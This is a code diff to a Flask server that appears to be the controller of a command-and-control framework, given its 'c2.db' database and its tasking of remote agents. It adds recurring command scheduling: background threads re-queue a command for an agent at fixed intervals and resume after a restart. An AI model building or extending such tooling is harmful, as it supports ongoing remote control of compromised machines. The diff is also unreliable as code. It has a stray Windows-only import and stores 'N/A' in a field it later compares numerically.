@@ -1,6 +1,8 @@
 import os
 import json
 import uuid
+from asyncio.windows_events import NULL
+
 from flask import Flask, request, jsonify, render_template, session, redirect, url_for, send_from_directory
 from werkzeug.utils import secure_filename
 from cryptography.fernet import Fernet
@@ -12,6 +14,8 @@ import secrets
 from functools import wraps
 import logging
 import sys
+import threading
+import time
 
 
 
@@ -347,18 +351,100 @@ def add_task():
         return jsonify({"error": "Unauthorized"}), 401
 
     data = request.get_json()
+    print("data", data)
     agent_id = data.get("id")
     command = data.get("task")
     scheduled_at = data.get("scheduled_at")
+    recurring_every = data.get("recurring_every")
+
+    if recurring_every is None:
+        recurring_every = "N/A"
+
     task_uuid = str(uuid.uuid4())
+
     db = get_db()
     db.execute("""
-        INSERT INTO tasks (uuid, agent_id, task_json, output, scheduled_at)
-        VALUES (?, ?, ?, NULL, ?)
-    """, (task_uuid, agent_id, json.dumps(command),scheduled_at))
+        INSERT INTO tasks (uuid, agent_id, task_json, output, scheduled_at, recurring_every)
+        VALUES (?, ?, ?, NULL, ?, ?)
+    """, (task_uuid, agent_id, json.dumps(command),scheduled_at,recurring_every))
     db.commit()
-
+    if recurring_every and recurring_every != "N/A":
+        print("initiating recurring task")
+        print("scheduled_at", scheduled_at)
+        thread = threading.Thread(
+        target=recurring_scheduler, args=(task_uuid, recurring_every, agent_id, command),daemon=True)
+        thread.start()
+    print("waiting for task")
     return jsonify({"status": "accepted", "uuid": task_uuid})
+
+
+def recurring_scheduler(task_uuid,recurring_every,agent_id,command):
+    minutes = int(recurring_every)
+    seconds = minutes * 60
+    time.sleep(seconds)
+    with app.app_context():
+        while True:
+            # 1. Wait first
+
+            # 2. Open a NEW connection for this specific cycle
+            # This prevents "Closed Database" and "Thread Sharing" errors
+            try:
+                # Connect directly using the path to your .db file
+                conn = sqlite3.connect('c2.db')
+                db = conn.cursor()
+
+                new_uuid = str(uuid.uuid4())
+                current_time = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
+
+                db.execute("""
+                        INSERT INTO tasks (uuid, agent_id, task_json, output, scheduled_at, recurring_every)
+                        VALUES (?, ?, ?, NULL, ?, ?)
+                    """, (new_uuid, agent_id, json.dumps(command), current_time, recurring_every))
+
+                conn.commit()
+                conn.close()  # Always close it so you don't leak connections
+
+                print(f"Successfully executed recurring task: {new_uuid}")
+                time.sleep(seconds)
+            except Exception as e:
+                print(f"Error in recurring_scheduler loop: {e}")
+
+
+def restart_recurring_tasks(app):
+    """Finds all recurring tasks in the DB and starts their threads."""
+    print("starting recurring tasks")
+    with app.app_context():
+        try:
+            conn = sqlite3.connect("c2.db")
+            db = conn.cursor()
+
+            # Find tasks that have a recurring interval
+            db.execute(
+                "SELECT uuid, agent_id, task_json, recurring_every FROM tasks WHERE recurring_every IS NOT NULL AND recurring_every > 0")
+            tasks = db.fetchall()
+            print(tasks)
+            conn.close()
+
+            if not tasks:
+                print("No recurring tasks found to resume.")
+                return
+
+            for task in tasks:
+                task_uuid, agent_id, task_json, recurring_every = task
+                command = json.loads(task_json)  # Convert string back to dict
+
+                print(f"Resuming recurring task: {task_uuid} every {recurring_every}m")
+
+                # Call your existing scheduler function in a new thread
+                thread = threading.Thread(
+                    target=recurring_scheduler,
+                    args=(task_uuid, recurring_every, agent_id, command),
+                    daemon=True
+                )
+                thread.start()
+
+        except Exception as e:
+            print(f"Error resuming tasks: {e}")
 
 # --- File upload ---
 @app.route('/upload', methods=['POST'])
@@ -704,4 +790,5 @@ def tools_file(filename):
 
 # --- Main ---
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000)
+    restart_recurring_tasks(app)
+    app.run(host="0.0.0.0", port=5000,use_reloader=False)
